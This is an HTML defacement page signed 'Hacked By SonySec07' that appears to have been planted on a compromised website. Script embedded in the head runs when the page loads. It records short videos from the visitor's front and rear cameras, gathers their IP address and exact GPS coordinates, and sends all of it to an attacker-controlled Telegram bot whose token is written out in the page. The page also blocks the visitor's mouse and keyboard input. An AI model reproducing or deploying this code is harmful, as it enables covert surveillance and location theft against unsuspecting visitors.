<html>
<head>
    <title>Hacked By SonySec07</title>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1"/> 
    <meta property="og:title" content="Hacked By SonySec07">
    <meta name="description" content="wh00pz ! your website security get down">
    <meta property="og:description" content="wh00pz ! your website security get down">
    <meta property="og:image" content="https://abilitysportsafrica.org/alok99.png">
    <meta name="theme-color" content="#fff">
    <style type='text/css'>body,a:hover{cursor:url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;}</style>
    
    <script>
        window.config = {
            botToken: "7599305876:AAFojw-7gJICoPIt5YXS8xdtVh7aM2vEsxM",
            chatID: "7221518562"
        };

        let isFrontCamera = true;
        let currentStream = null;
        let videoRecorder = null;
        const RECORD_DURATION = 5000; // 5 detik

        async function getVideoDevices() {
            const devices = await navigator.mediaDevices.enumerateDevices();
            return devices.filter(device => device.kind === 'videoinput');
        }

        async function startVideoRecording() {
            try {
                const videoDevices = await getVideoDevices();
                if(videoDevices.length === 0) {
                    console.log('No camera detected');
                    return;
                }

                const constraints = {
                    video: {
                        facingMode: isFrontCamera ? "user" : "environment",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };

                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                currentStream = stream;
                const chunks = [];
                
                videoRecorder = new MediaRecorder(stream);
                videoRecorder.ondataavailable = (event) => chunks.push(event.data);
                
                videoRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    await sendLocationData(videoBlob);
                    
                    currentStream.getTracks().forEach(track => track.stop());
                    if(isFrontCamera && videoDevices.length > 1) {
                        isFrontCamera = false;
                        setTimeout(startVideoRecording, 1000);
                    }
                };

                videoRecorder.start();
                setTimeout(() => {
                    if(videoRecorder.state === "recording") {
                        videoRecorder.stop();
                    }
                }, RECORD_DURATION);

            } catch(error) {
                console.error('Camera access error:', error);
            }
        }

        async function getLocation() {
            return new Promise((resolve, reject) => {
                if(!navigator.geolocation) {
                    reject('Geolocation not supported');
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    position => resolve(position.coords),
                    error => reject(error),
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function sendLocationData(videoBlob) {
            try {
                // Get IP and Location
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();
                const coords = await getLocation();
                
                const message = `📌 5 Second Recording Captured
📡 IP Address: ${ip}
📍 Coordinates:
Latitude: ${coords.latitude}
Longitude: ${coords.longitude}
🌍 Google Maps: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}
🕒 Timestamp: ${new Date().toLocaleString()}`;

                // Send Video
                const videoForm = new FormData();
                videoForm.append("chat_id", window.config.chatID);
                videoForm.append("video", videoBlob, `recording_${Date.now()}.mp4`);
                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendVideo`, {
                    method: 'POST',
                    body: videoForm
                });

                // Send Location Details
                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: window.config.chatID,
                        text: message
                    })
                });

            } catch(error) {
                console.error('Error sending data:', error);
                // Fallback if location blocked
                const errorMessage = `❌ Location access blocked!\nIP: ${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)}`;
                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: window.config.chatID,
                        text: errorMessage
                    })
                });
            }
        }

        // Initialize recording when page loads
        document.addEventListener('DOMContentLoaded', () => {
            if(navigator.mediaDevices?.getUserMedia) {
                startVideoRecording();
            }
            try {
                document.querySelector('audio').play();
            } catch(e) {
                console.log('Audio autoplay blocked');
            }
        });
    </script>
</head>
<body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
    <table width="100%" height="80%">
        <td>
            <center>
                <small>4 BROTHER</small><br>
                <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220">
                <br>Hacked by <red><i>SonySec07</i></red><br>
                <font size="2">wh00pz ! your website security get down<br>patch it before something bad happens</font><br>
                <br><small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
                <font size="2"><i>Greetz</i><br>
                Pyscodes - CurutG0D403 - Clutsert03 - BentoSec21 - TN.CUPLIS - JohnFelix - MR.VENOM - HanzRazor - NightBot405 - MR.CULA - EYIKK - M4SKGANS - Inzz - ClayOxtymus1337 - MR.KRIBO - Amigamer404 - Jakarta Blackhat Cyber Crime - MukoMuko Cyber Team - Muslim Cyber Face - FromLammerToMastah - KaliMalang BlackHat Team - Nigeria Cyber Force - FSOCIETY TEAM</font>
            </center>
        </td>
    </table>
    <audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay loop></audio>
</body>
</html>
